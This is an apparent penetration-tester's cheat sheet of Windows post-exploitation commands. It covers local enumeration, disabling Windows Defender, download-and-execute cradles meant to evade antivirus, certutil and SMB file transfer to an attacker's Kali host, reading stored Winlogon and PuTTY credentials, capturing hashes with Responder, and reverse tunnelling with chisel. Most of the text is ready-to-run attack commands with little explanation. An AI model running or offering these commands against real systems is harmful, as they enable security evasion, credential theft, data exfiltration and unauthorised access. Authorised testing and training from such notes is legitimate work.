
Always good to run [PEASS-ng](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

For more detailed guide, see [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

## General info

```PowerShell
# CMD
net users %username% # Me
net users # All local users
net localgroup # Groups
net localgroup Administrators # Who is inside Administrators group
whoami /all # Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### System

``` Powershell
# System information
systeminfo
[System.Environment]::OSVersion.Version #Current OS version
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches

# PowerShell history
ConsoleHost_history #Find the PATH where is saved
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Powershell logs
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

Note: Check [this site](https://msrc.microsoft.com/update-guide/vulnerability) for vulnerabilities.
### Environment

```PowerShell
# Credentials saved in env variables?
env
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Ports

```powershell
netstat -ano
```
## If you have admin privileges

```powershell
# Disable Windows Defender real time monitoring
Set-MpPreference -DisableRealTimeMonitoring $true

# Disable Windows Defender scanning for downloaded files
Set-MpPreference -DisableIOAVProtection $true
```
## Transfer files

### HTTP

**(SEND) KALI:**
```bash
python3 -m http.server 8080
```

**(RECEIVE) WINDOWS:**
```powershell
# Don't save (helps bypass AV)
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip:8080/file')"

powershell.exe iex (iwr http://ip:8080/file -usebasicparsing)

# Write to disk
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip:8080/file','C:\Users\Public\Downloads\file')"

powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip:8080/file' -Outfile '/path/to/file'"

certutil -urlcache -f http://ip:8080/file file
```
### SMB

**(SEND) KALI:**
```bash
sudo impacket-smbserver sharename /path/to/serve
```

**(RECEIVE) WINDOWS:**
```powershell
## Option 1
net use sharename: \\ip\myshare # 1: Mount
net use sharename: /d # 2: disconnect
net use sharename: /delete # 3: delete

## Option 2
New-PSDrive -Name "sharename" -PSProvider "FileSystem" -Root "\\ip\sharename"
Remove-PSDrive -Name sharename

## Option 3 (not mounting)
copy //kali_ip/sharename/file_name C:\path\to\save
```

**(SEND) WINDOWS:**
```powershell
copy C:\path\to\file //kali_ip/sharename # Send to kali share
```

## Credentials

### Common credential locations

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there

# Maybe in the clipboard?
powershell -command "Get-Clipboard"

# May contain creds
dir /s SAM
dir /s SYSTEM
dir /s Unattend.xml
```
### Responder capture hashes

**KALI**
```bash
sudo responder -I tun0 -wrf
```

**WINDOWS**
```powershell
# Get it to connect to your server
# e.g. smb
copy \\ip\test\file
```

## Port forwarding

**KALI**
```bash
./chisel server --reverse --port 9001
```

**WINDOWS**
```powershell
.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
```

## Services

```powershell
# Get a list of services
net start
wmic service list brief
sc query
Get-Service

# Get info of service
sc qc <service_name>
```


